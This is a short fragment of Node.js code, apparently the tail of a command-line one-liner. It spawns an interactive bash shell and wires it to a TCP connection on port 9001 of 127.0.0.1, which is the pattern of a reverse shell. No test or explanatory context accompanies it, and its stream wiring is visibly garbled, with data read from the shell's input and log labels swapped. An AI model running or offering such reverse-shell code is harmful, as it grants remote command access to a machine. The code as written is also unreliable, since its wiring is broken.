const net = require('net');
const { spawn } = require('child_process');
const proc = spawn('/bin/bash', ['-i'], { stdio: ['pipe', 'pipe', 'pipe'] });
proc.stdin.on('data', d => console.log('STDOUT:', d.toString()));
proc.stdout.on('data', d => console.log('STDERR:', d.toString()));
proc.stderr.on('data', d => console.log('STDERR:', d.toString()));
const client = net.connect(9001, '127.0.0.1', () => {
  console.log('CONNECTED');
  proc.stdin.pipe(client);
  client.pipe(proc.stdin);
  client.on('data', d => proc.stdout.write(d));
  client.on('end', () => proc.kill());
  proc.on('exit', () => client.end());
});
client.on('error', e => { console.error('ERR', e); process.exit(1); });
" > /tmp/out.log 2>&1

